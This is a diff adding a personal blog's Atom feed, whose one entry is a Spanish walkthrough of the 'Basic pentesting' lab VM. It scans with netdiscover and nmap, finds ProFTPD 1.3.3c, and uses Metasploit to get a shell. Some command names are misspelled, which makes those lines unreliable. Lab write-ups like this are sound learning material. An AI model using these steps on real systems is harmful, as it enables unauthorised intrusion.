@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+	<title>Pagina de Juan Manuel</title>
+	<subtitle>Subtitle. Update me.</subtitle>
+	
+	<link href="https://update-me.com/feed/feed.xml" rel="self"/>
+	<link href="https://update-me.com"/>
+	<updated>2025-03-04T00:00:00+00:00</updated>
+	<id>https://update-me.com</id>
+	<author>
+		<name>Juan Manuel Herrera</name>
+		<email></email>
+	</author>
+	
+	<entry>
+		<title>Basic pentesting1.</title>
+		<link href="https://update-me.com/posts/pasosbasic_pentesting/"/>
+		<updated>2025-03-04T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/pasosbasic_pentesting/</id>
+		<content type="html">
+		  &lt;h1 id=&quot;instalar-maquina-poner-en-modo-puente&quot;&gt;Instalar maquina poner en modo puente &lt;a class=&quot;direct-link&quot; href=&quot;#instalar-maquina-poner-en-modo-puente&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
+&lt;h2 id=&quot;buscar-la-ip&quot;&gt;Buscar la ip &lt;a class=&quot;direct-link&quot; href=&quot;#buscar-la-ip&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; netdiscover -r &lt;span class=&quot;token number&quot;&gt;10.0&lt;/span&gt;.0.0/16&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;10.0.4.39       08:00:27:9b:76:e6     39    2340  PCS Systemtechnik GmbH&lt;/p&gt;
+&lt;p&gt;Vemos las ip&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; nmap &lt;span class=&quot;token number&quot;&gt;10.0&lt;/span&gt;.4.39&lt;br&gt;nmap -Pn -sV &lt;span class=&quot;token number&quot;&gt;10.0&lt;/span&gt;.4.39&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PORT   STATE SERVICE VERSION&lt;br&gt;
+21/tcp open  ftp     ProFTPD 1.3.3c&lt;br&gt;
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)&lt;br&gt;
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))&lt;br&gt;
+MAC Address: 08:00:27:9B:76:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)&lt;/p&gt;
+&lt;h2 id=&quot;buscamos-vulnerabilidades-que-tiene-los-servicios&quot;&gt;Buscamos vulnerabilidades que tiene los servicios &lt;a class=&quot;direct-link&quot; href=&quot;#buscamos-vulnerabilidades-que-tiene-los-servicios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Exploit database&lt;/li&gt;
+&lt;li&gt;Google&lt;/li&gt;
+&lt;li&gt;Chat gpt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;En Exploit database introducimos el servicio de ProFTPD 1.3.3c, nos dice que hay disponible un metaexploit.&lt;/p&gt;
+&lt;h2 id=&quot;ejecutar-el-metaexploit&quot;&gt;Ejecutar el metaexploit &lt;a class=&quot;direct-link&quot; href=&quot;#ejecutar-el-metaexploit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Abrir la consola mfsconsole&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt; &lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; mfsconsole&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Buscar exploit que vamos a usar&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt; search ProFTPD &lt;span class=&quot;token number&quot;&gt;1.3&lt;/span&gt;.3c&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Seleccionamos el payloads que vamos a usas&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt; show payload&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PONEMOS ES QUE NOSOTROS QUERAMOS O MÁS NOS GUSTE&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Una vez seleccionado ponemos los parametros que necesitamos&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt; show options&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; RHOSTS &lt;span class=&quot;token number&quot;&gt;10.0&lt;/span&gt;.4.39&lt;br&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; LHOSTS &lt;span class=&quot;token string&quot;&gt;&quot;MI IP&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Ejecutar&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt; run&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Ya se levantaria un shell para acceder a la maquina&lt;/li&gt;
+&lt;/ul&gt;
+
+			
+		</content>
+	</entry>
+</feed>
